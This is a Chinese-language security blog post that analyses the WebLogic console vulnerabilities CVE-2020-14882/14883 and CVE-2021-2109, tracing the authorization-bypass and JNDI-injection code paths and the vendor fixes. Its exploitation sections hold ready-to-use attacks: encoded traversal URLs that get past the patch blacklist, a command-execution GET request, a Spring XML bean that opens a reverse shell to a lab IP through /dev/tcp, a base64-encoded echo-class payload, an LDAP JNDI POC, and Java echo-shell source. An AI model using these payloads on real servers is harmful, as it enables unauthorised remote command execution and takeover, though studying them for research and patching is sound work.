title: Weblogic未授权远程命令执行漏洞
author: bmth
tags:
  - weblogic
categories:
  - java
top_img: 'https://img-blog.csdnimg.cn/4693090433804755a57b4e2240e63479.png'
cover: 'https://img-blog.csdnimg.cn/4693090433804755a57b4e2240e63479.png'
date: 2023-01-30 01:49:32
---
![](https://img-blog.csdnimg.cn/4693090433804755a57b4e2240e63479.png)
CVE-2020-14882 允许未授权的用户绕过管理控制台的权限验证访问后台，CVE-2020-14883 允许后台任意用户通过 HTTP 协议执行任意命令。使用这两个漏洞组成的利用链，可通过一个 GET 请求在远程 Weblogic 服务器上以未授权的任意用户身份执行命令

影响版本：
- Oracle WebLogic Server 10.3.6.0.0
- Oracle WebLogic Server 12.1.3.0.0
- Oracle WebLogic Server 12.2.1.3.0
- Oracle WebLogic Server 12.2.1.4.0
- Oracle WebLogic Server 14.1.1.0.0


## CVE-2020-14882
在正常访问console后台时会提示输入帐号密码
![](https://img-blog.csdnimg.cn/f9956b2309a44f7ab7dc1e18659cd6b6.png)

但是可以使用url二次编码`/console/images/%252e%252e/console.portal`，通过这个就可以实现路径穿越，未授权访问管理后台
>但是通过未授权访问的后台与正常登陆的后台相比，由于权限不足，缺少部署等功能，无法安装应用，所以也无法通过部署项目等方式直接获取权限

![](https://img-blog.csdnimg.cn/86b47a9d1a7b44d689bfedad2666f615.png)

### 漏洞分析
该漏洞的触发是在 console 组件，而console对应着webapp服务，配置文件为`wlserver/server/lib/consoleapp/webapp/WEB-INF/web.xml`
正常登录后会访问一个`console.portal`，那么在web.xml中看一下相关的路由情况
![](https://img-blog.csdnimg.cn/dcd043bbb38047f3be6cad2811e57873.png)
可以看到对应的servlet为AppManagerServlet
![](https://img-blog.csdnimg.cn/86022d47ef95426a9e864eb476f3231b.png)

从上面的 web.xml 内容中可以得出：
1. `MBeanUtilsInitSingleFileServlet`是AppManagerServlet的 servlet-class-name 初始化的值
2. 访问`*.portal`会经过AppManagerServlet的分派处理（通过认证后访问console的路径是/console/console.portal）

首先weblogic的请求会经过`weblogic.servlet.internal.WebAppServletContext#execute`处理，这里会调用`securedExecute()`
![](https://img-blog.csdnimg.cn/35e351b3e8484792bc8a40552936b53d.png)

跟进发现调用`doSecuredExecute()`方法
![](https://img-blog.csdnimg.cn/1a52454defda4fd6847eb427046d4fa6.png)

继续跟进可以看到调用`weblogic.servlet.security.internal.WebAppSecurity#checkAccess()`进行权限的校验
![](https://img-blog.csdnimg.cn/f4c7a91a1dca4fd280f3dd65a9e21ec1.png)
第一次请求的时候checkAllResources为false，于是调用getConstraint方法
![](https://img-blog.csdnimg.cn/51deba2226024fd884685aee8b6d89e0.png)

跟进`weblogic.servlet.security.internal.WebAppSecurityWLS#getConstraint()`
![](https://img-blog.csdnimg.cn/f3b58b81a3434574af29c0c50aceab9e.png)
这里会比较我们的relURI是否匹配我们matchMap中的路径，并判断rcForAllMethods和rcForOneMethod是否为null
![](https://img-blog.csdnimg.cn/55fcac29b2934980b5ee5d3ce65dbb0c.png)

当访问的路由符合该路由映射表中的情况时，将根据配置设置rcForAllMethods变量，也就是最终返回的resourceConstraint
如果请求的路径在matchMap列表里，那么unrestricted值就为true
![](https://img-blog.csdnimg.cn/ee08b17f785f4db9b019ce8883af66d1.png)

return后接着做if判断，resourceConstraint不为null，调用`weblogic.servlet.security.internal.SecurityModule#isAuthorized`
![](https://img-blog.csdnimg.cn/923da67c6ca24826b59cd0b3df43e2fb.png)
在该方法中获取用户session，调用`weblogic.servlet.security.internal.ChainedSecurityModule#checkAccess`方法做进一步权限校验
![](https://img-blog.csdnimg.cn/7706412308ac45beb2bf341f1db2873c.png)

最后会在`weblogic.servlet.security.internal.CertSecurityModule#checkUserPerm`中调用`weblogic.servlet.security.internal.WebAppSecurity#hasPermission`方法
![](https://img-blog.csdnimg.cn/ef069d5b20b84489aed38a8a4340e6c6.png)

根据最开始生成的`ResourceConstraint`对象，判断该次http请求是否有权限
![](https://img-blog.csdnimg.cn/5d089d4658b346b1b22e33272349788c.png)

如果用户访问的是静态资源，则返回unrestricted的值，hasPermission返回为true，weblogic认为你有权限访问，于是就会放行。如果你访问非静态权限，则直接拦截你的请求，重定向至登陆页

二次编码的原因：发过去的时候http会解一次码，也就是说如果我们传的是`/images/%2E%2E%2Fconsole.portal`，那么解码后就是`/images/../console.portal`，这样发到服务端就没办法匹配到静态资源了，直接处理成了`/console.portal`


### 漏洞修复
借用师傅的一张图，[https://twitter.com/chybeta/status/1322131143034957826](https://twitter.com/chybeta/status/1322131143034957826)
黑名单为：
```
private static final String[] IllegalUrl = new String[]{";", "%252E%252E", "%2E%2E", "..", "%3C", "%3E", "<", ">"};
```
![](https://img-blog.csdnimg.cn/98d49bdbf3fd47c18de65f2e9e9f7668.png)

可以看到是使用了黑名单进行过滤，但是过滤的不够完善导致被绕过了。。。

例如：
```
/console/css/%252E./console.portal
/console/css/%252e%252e%252fconsole.portal
/console/css/%25%32%65%25%32%65%25%32%66console.portal
/console/css/%25%32%65%25%32%65%25%32%66consolejndi.portal

```


参考：
[cve-2020-14882 weblogic 越权绕过登录分析](https://mp.weixin.qq.com/s/_zNr5Jw7tH_6XlUdudhMhA)
[CVE-2020-14882：Weblogic Console 权限绕过深入解析](https://cert.360.cn/report/detail?id=a95c049c576af8d0e56ae14fad6813f4)


## CVE-2020-14883

### 漏洞分析
主要的漏洞成因是在`com.bea.console.handles.HandleFactory#getHandle`类
![](https://img-blog.csdnimg.cn/7d0ad5069a4a4a6ebfa9ba81679aaa15.png)

这里进行反射并实例化，但只能执行该类的一个String类型的参数构造器


### 漏洞利用
#### ShellSession
使用的是`com.tangosol.coherence.mvel2.sh.ShellSession`这个类，但是在10.3.6.0没有这个类，所以只能在更高版本触发
看到他的参数为String的构造函数
![](https://img-blog.csdnimg.cn/34a9721bf5d5448ca6ba2e596251a747.png)

这里调用了一次无参构造函数，然后再调用该类的exec方法
![](https://img-blog.csdnimg.cn/acc83d844b284fa4ab45a53c766d5554.png)

最后就是解析命令并执行了

命令执行回显：
```
GET /console/images/%252e%252e/console.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession('weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod("getServletRequest").invoke(obj); String cmd = req.getHeader("cmd");String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};if(cmd != null ){ String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter("\\A").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod("getResponse").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();} currentThread.interrupt();') HTTP/1.1
```
![](https://img-blog.csdnimg.cn/f6b0e986511b4156b13e5d27927c8077.png)

使用`Thread.interrupt()`可以中断线程，避免命令被执行多次


#### FileSystemXmlApplicationContext
利用前提是需要出网

`com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext`这种方法最早在CVE-2019-2725被提出，该方法通用于各版本weblogic
![](https://img-blog.csdnimg.cn/05ab419b47124aac95fb5db57b4d7e22.png)

首先我们构造一个恶意的xml文件
```xml
<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
  <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
    <constructor-arg>
      <list>
        <value>/bin/bash</value>
        <value>-c</value>
        <value><![CDATA[/bin/bash -i >& /dev/tcp/192.168.111.178/6666 0>&1]]></value>
      </list>
    </constructor-arg>
  </bean>
</beans>
```
然后使用post进行传参
```
POST /console/css/%25%32%65%25%32%65%25%32%66console.portal HTTP/1.1

_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://192.168.111.178:8000/poc.xml")
```
![](https://img-blog.csdnimg.cn/49dd42cd328845389da4b5557f879e3a.png)

还有个类`com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext`也是同理的

看到了c0ny1的一篇文章：[weblogic下spring bean RCE的一些拓展](https://gv7.me/articles/2021/some-extensions-of-spring-bean-rce-under-weblogic/)
可以使用`factory-method`标签调用返回值不为void的有参，静态和非静态方法
给一个回显的payload吧
```xml
<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation=" http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd ">
    <bean id="decoder" class="weblogic.utils.encoders.BASE64Decoder"/>
    <bean id="clazzBytes" factory-bean="decoder" factory-method="decodeBuffer">
        <constructor-arg type="java.lang.String" value="yv66vgAAADMApgoADQBFCgBGAEcHAEgKAAMASQoADQBKCgAKAEsIAEwKAAsATQgATgcATwcAUAoACgBRBwBSCAA3CgBTAFQKAAsAVQcAVgoAVwBYCgBXAFkKAFoAWwoAEQBcCABdCgARAF4KABEAXwgAYAcAYQoAGgBiBwBjCgAcAGQKAGUAZgoAZQBnCgAaAGgIAGkKAGoAawgAbAoACgBtCgBuAG8KAG4AcAgAcQcAcgoAKABzBwB0AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAA5MV2VibG9naWNFY2hvOwEACDxjbGluaXQ+AQAGcmVzdWx0AQASTGphdmEvbGFuZy9TdHJpbmc7AQADcmVzAQAvTHdlYmxvZ2ljL3NlcnZsZXQvaW50ZXJuYWwvU2VydmxldFJlc3BvbnNlSW1wbDsBAANjbWQBAAVmaWVsZAEAGUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAANvYmoBABJMamF2YS9sYW5nL09iamVjdDsBAAdhZGFwdGVyAQAbTHdlYmxvZ2ljL3dvcmsvV29ya0FkYXB0ZXI7AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEADVN0YWNrTWFwVGFibGUHAHUHAHIBAApTb3VyY2VGaWxlAQARV2VibG9naWNFY2hvLmphdmEMACsALAcAdgwAdwB4AQAbd2VibG9naWMvd29yay9FeGVjdXRlVGhyZWFkDAB5AHoMAHsAfAwAfQB+AQASU2VydmxldFJlcXVlc3RJbXBsDAB/AIABAAlnZXRIZWFkZXIBAA9qYXZhL2xhbmcvQ2xhc3MBABBqYXZhL2xhbmcvU3RyaW5nDACBAIIBABBqYXZhL2xhbmcvT2JqZWN0BwCDDACEAIUMAIYAhwEAEWphdmEvdXRpbC9TY2FubmVyBwCIDACJAIoMAIsAjAcAjQwAjgCPDAArAJABAAJcQQwAkQCSDACTAH4BAAtnZXRSZXNwb25zZQEALXdlYmxvZ2ljL3NlcnZsZXQvaW50ZXJuYWwvU2VydmxldFJlc3BvbnNlSW1wbAwAlACVAQAjd2VibG9naWMveG1sL3V0aWwvU3RyaW5nSW5wdXRTdHJlYW0MACsAlgcAlwwAmACQDACZACwMAJoAmwEAAAcAnAwAnQCWAQARY29ubmVjdGlvbkhhbmRsZXIMAJ4AnwcAoAwAoQCiDACjAKQBABFnZXRTZXJ2bGV0UmVxdWVzdAEAE2phdmEvbGFuZy9FeGNlcHRpb24MAKUALAEADFdlYmxvZ2ljRWNobwEAGXdlYmxvZ2ljL3dvcmsvV29ya0FkYXB0ZXIBABBqYXZhL2xhbmcvVGhyZWFkAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAOZ2V0Q3VycmVudFdvcmsBAB0oKUx3ZWJsb2dpYy93b3JrL1dvcmtBZGFwdGVyOwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAB2dldE5hbWUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGVuZHNXaXRoAQAVKExqYXZhL2xhbmcvU3RyaW5nOylaAQAJZ2V0TWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAB2lzRW1wdHkBAAMoKVoBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAEbmV4dAEAFmdldFNlcnZsZXRPdXRwdXRTdHJlYW0BADUoKUx3ZWJsb2dpYy9zZXJ2bGV0L2ludGVybmFsL1NlcnZsZXRPdXRwdXRTdHJlYW1JbXBsOwEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAMXdlYmxvZ2ljL3NlcnZsZXQvaW50ZXJuYWwvU2VydmxldE91dHB1dFN0cmVhbUltcGwBAAt3cml0ZVN0cmVhbQEABWZsdXNoAQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAFd3JpdGUBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAPcHJpbnRTdGFja1RyYWNlACEAKgANAAAAAAACAAEAKwAsAAEALQAAAC8AAQABAAAABSq3AAGxAAAAAgAuAAAABgABAAAACAAvAAAADAABAAAABQAwADEAAAAIADIALAABAC0AAAJbAAYABgAAAVi4AALAAAO2AARLKrYABbYABhIHtgAImQCHKrYABRIJBL0AClkDEwALU7YADCoEvQANWQMSDlO2AA/AAAtMK8YAXCu2ABCaAFW7ABFZuAASK7YAE7YAFLcAFRIWtgAXtgAYTSq2AAUSGQO9AAq2AAwqA70ADbYAD8AAGk4ttgAbuwAcWSy3AB22AB4ttgAbtgAfLbYAIBIhtgAipwC1KrYABRIjtgAkTCsEtgAlKyq2ACZNLLYABRInA70ACrYADCwDvQANtgAPTSy2AAUSCQS9AApZAxMAC1O2AAwsBL0ADVkDEg5TtgAPwAALTi3GAGIttgAQmgBbuwARWbgAEi22ABO2ABS3ABUSFrYAF7YAGDoELLYABRIZA70ACrYADCwDvQANtgAPwAAaOgUZBbYAG7sAHFkZBLcAHbYAHhkFtgAbtgAfGQW2ACASIbYAIqcACEsqtgApsQABAAABTwFSACgAAwAuAAAAZgAZAAAACwAKAAwAGQANAD0ADgBIAA8AYgAQAHsAEQCKABIAkQATAJoAFQCdABYApwAXAKwAGACyABkAyAAaAOwAGwD3ABwBEgAdASwAHgE9AB8BRQAgAU8AJQFSACMBUwAkAVcAJgAvAAAAZgAKAGIAOAAzADQAAgB7AB8ANQA2AAMAPQBdADcANAABARIAPQAzADQABAEsACMANQA2AAUApwCoADgAOQABALIAnQA6ADsAAgDsAGMANwA0AAMACgFFADwAPQAAAVMABAA+AD8AAABAAAAAEQAF/ACaBwBBAvoAsUIHAEIEAAEAQwAAAAIARA=="/>
    </bean>
    <bean id="classLoader" class="javax.management.loading.MLet"/>
    <bean id="clazz" factory-bean="classLoader" factory-method="defineClass">
        <constructor-arg type="[B" ref="clazzBytes"/>
        <constructor-arg type="int" value="0"/>
        <constructor-arg type="int" value="2845"/>
    </bean>
    <bean factory-bean="clazz" factory-method="newInstance"/>
</beans>
```
![](https://img-blog.csdnimg.cn/0e6bfc301b60478db1bcbf00540dc42e.png)

可以看到成功回显
### 漏洞修复
![](https://img-blog.csdnimg.cn/77c474f1a63142b9baa284913e2a0986.png)
修复方式是判断这个className是否为Handle类的子类

参考：
[Weblogic 未授权命令执行分析复现（CVE-2020-14882/14883）](https://paper.seebug.org/1395/)
[WebLogic one GET request RCE分析（CVE-2020-14882+CVE-2020-14883）](https://www.anquanke.com/post/id/224059)
[[CVE-2020-14882/14883]WebLogioc console认证绕过+任意代码执行 ](https://mp.weixin.qq.com/s/u8cZEcku-uIbGAVAcos5Tw)
[https://github.com/jas502n/CVE-2020-14882](https://github.com/jas502n/CVE-2020-14882)



## CVE-2021-2109
该漏洞主要是JNDI注入，导致攻击者可利用此漏洞远程代码执行

POC：(注意`192.168.111;178:1389`有个点为分号)
```
POST /console/css/%25%32%65%25%32%65%25%32%66consolejndi.portal HTTP/1.1

_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle("ldap://192.168.111;178:1389/Basic/WeblogicEcho;AdminServer")
```
![](https://img-blog.csdnimg.cn/fd3571d75dfa428a9b9f5ae1d3dac6d7.png)

WeblogicEcho代码如下：
```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import weblogic.servlet.internal.ServletResponseImpl;
import weblogic.work.ExecuteThread;
import weblogic.work.WorkAdapter;
import weblogic.xml.util.StringInputStream;
import java.lang.reflect.Field;
import java.util.Scanner;

public class WeblogicEchoTemplate extends AbstractTranslet {

    public WeblogicEchoTemplate(){
        try{
            WorkAdapter adapter = ((ExecuteThread)Thread.currentThread()).getCurrentWork();
            if(adapter.getClass().getName().endsWith("ServletRequestImpl")){
                String cmd = (String) adapter.getClass().getMethod("getHeader", String.class).invoke(adapter, "cmd");
                if(cmd != null && !cmd.isEmpty()){
                    String result = new Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
                    ServletResponseImpl res = (ServletResponseImpl) adapter.getClass().getMethod("getResponse").invoke(adapter);
                    res.getServletOutputStream().writeStream(new StringInputStream(result));
                    res.getServletOutputStream().flush();
                    res.getWriter().write("");
                }
            }else{
                Field field = adapter.getClass().getDeclaredField("connectionHandler");
                field.setAccessible(true);
                Object obj = field.get(adapter);
                obj = obj.getClass().getMethod("getServletRequest").invoke(obj);
                String cmd = (String) obj.getClass().getMethod("getHeader", String.class).invoke(obj, "cmd");
                if(cmd != null && !cmd.isEmpty()){
                    String result = new Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
                    ServletResponseImpl res = (ServletResponseImpl) obj.getClass().getMethod("getResponse").invoke(obj);
                    res.getServletOutputStream().writeStream(new StringInputStream(result));
                    res.getServletOutputStream().flush();
                    res.getWriter().write("");
                }
            }
        }catch(Exception e){
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```

### 漏洞分析
这个漏洞利用有两个关键类
第一个类是`com.bea.console.handles.JndiBindingHandle`，他是Handle的子类
![](https://img-blog.csdnimg.cn/b2eebac3e4a74f339a78f5bc57fd25bd.png)

可以看到JndiBindingHandle是一些实例化操作，但并没有执行功能

理论上Weblogic Server的console的操作大部分是建立在Action的基础上，所以我们还需要去寻找一个Action，找到`/wlserver/server/lib/consoleapp/webapp/consolejndi.portal`文件
![](https://img-blog.csdnimg.cn/fdae56aed87f41428079853e2e2b0a3b.png)

发现标签 JNDIBindingPageGeneral 指定的路径是 `/PortalConfig/jndi/jndibinding.portlet`，继续跟进可以找到这次利用的另一个关键的类JNDIBindingAction
![](https://img-blog.csdnimg.cn/2ed586bd2a43489a9e0dec6d9e9d43f3.png)

看到`com.bea.console.actions.jndi.JNDIBindingAction#execute`
![](https://img-blog.csdnimg.cn/5286a66e5d70424dbe43167f4d9c71d2.png)

可以看到 lookup 中的值来源于 `bindingHandle.getContext()`和`bindingHandle.getBinding()` ，同时需要serverMBean不为空

跟进到`com.bea.console.utils.MBeanUtils#getAnyServerMBean`
看到serverMBean是由`getDomainMBean().lookupServer(serverName)`获取
![](https://img-blog.csdnimg.cn/95c8ca97177542b78722b188ee34a58f.png)

继续跟进到`weblogic.management.configuration.DomainMBeanImpl#lookupServer`
想要返回不为空，则需要传给lookupServer的值等于`this._Servers`中的name，通过获取 `this._Servers[0].getName()`可以得到这个值为 AdminServer
![](https://img-blog.csdnimg.cn/a52eaf4b53d344f9bc6e08158d5bc9f3.png)

而context、bindName、serverName的值都是从bindingHandle中获取的，正巧我们可以控制JndiBindingHandle实例化的值(objectIdentifier)
![](https://img-blog.csdnimg.cn/1dabe3deb36b4d36aa63555cd2bca7db.png)

接着来就需要看下objectIdentifier和以上3个值有什么关系了，看一下3个成员变量的get函数，发现他们都和getComponents函数有关
![](https://img-blog.csdnimg.cn/477f07860dfb4418b5f584839657ee38.png)

最后看到`com.bea.console.handles.HandleImpl#getComponents`
```java
private String[] getComponents() {
    if (this.components == null) {
        String serialized = this.getObjectIdentifier();
        ArrayList componentList = new ArrayList();
        StringBuffer currentComponent = new StringBuffer();
        boolean lastWasSpecial = false;

        for(int i = 0; i < serialized.length(); ++i) {
            char c = serialized.charAt(i);
            if (lastWasSpecial) {
                if (c == '0') {
                    if (currentComponent == null) {
                        throw new AssertionError("Handle component already null : '" + serialized + '"');
                    }

                    if (currentComponent.length() > 0) {
                        throw new AssertionError("Null handle component preceeded by a character : '" + serialized + "'");
                    }

                    currentComponent = null;
                } else if (c == '\\') {
                    if (currentComponent == null) {
                        throw new AssertionError("Null handle followed by \\ : '" + serialized + "'");
                    }

                    currentComponent.append('\\');
                } else {
                    if (c != ';') {
                        throw new AssertionError("\\ in handle followed by a character :'" + serialized + "'");
                    }

                    if (currentComponent == null) {
                        throw new AssertionError("Null handle followed by ; : '" + serialized + "'");
                    }

                    currentComponent.append(';');
                }

                lastWasSpecial = false;
            } else if (c == '\\') {
                if (currentComponent == null) {
                    throw new AssertionError("Null handle followed by \\ : '" + serialized + "'");
                }

                lastWasSpecial = true;
            } else if (c == ';') {
                String component = currentComponent != null ? currentComponent.toString() : null;
                componentList.add(component);
                currentComponent = new StringBuffer();
            } else {
                if (currentComponent == null) {
                    throw new AssertionError("Null handle followed by  a character : '" + serialized + "'");
                }

                currentComponent.append(c);
            }
        }

        if (lastWasSpecial) {
            throw new AssertionError("Last character in handle is \\ :'" + serialized + "'");
        }

        String component = currentComponent != null ? currentComponent.toString() : null;
        componentList.add(component);
        this.components = (String[])((String[])componentList.toArray(new String[componentList.size()]));
    }

    return this.components;
}
```

看到通过`this.getObjectIdentifier()`获取`objectIdentifier`的值，然后通过分号`;`分隔开来，并将分割后的数据填入 String 数组。相当于参数全部可控，造成jndi注入


参考：
[CVE-2021-2109：Weblogic远程代码执行分析复现](https://cloud.tencent.com/developer/article/1797518)
[阿里云安全获Oracle官方致谢 ｜Weblogic Server远程代码执行漏洞预警(CVE-2021-2109) ](https://mp.weixin.qq.com/s/wX9TMXl1KVWwB_k6EZOklw)
[WebLogic CVE-2021-2109 JNDI RCE](https://y4er.com/posts/weblogic-cve-2021-2109-jndi-rce/)